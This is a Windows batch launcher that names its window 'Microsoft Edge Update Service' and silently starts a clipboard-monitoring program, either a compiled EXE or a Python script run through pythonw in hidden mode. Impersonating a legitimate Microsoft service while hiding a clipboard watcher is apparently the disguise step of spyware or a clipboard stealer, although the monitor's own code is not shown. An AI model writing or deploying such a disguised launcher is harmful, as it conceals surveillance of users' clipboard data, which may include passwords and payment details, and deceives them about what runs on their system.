@echo off
title Microsoft Edge Update Service

:: Prefer compiled EXE if it exists
if exist "%~dp0dist\clipboard_monitor.exe" (
    start "" "%~dp0dist\clipboard_monitor.exe"
) else (
    start "" pythonw "%~dp0clipboard_monitor.py" hidden
)

exit
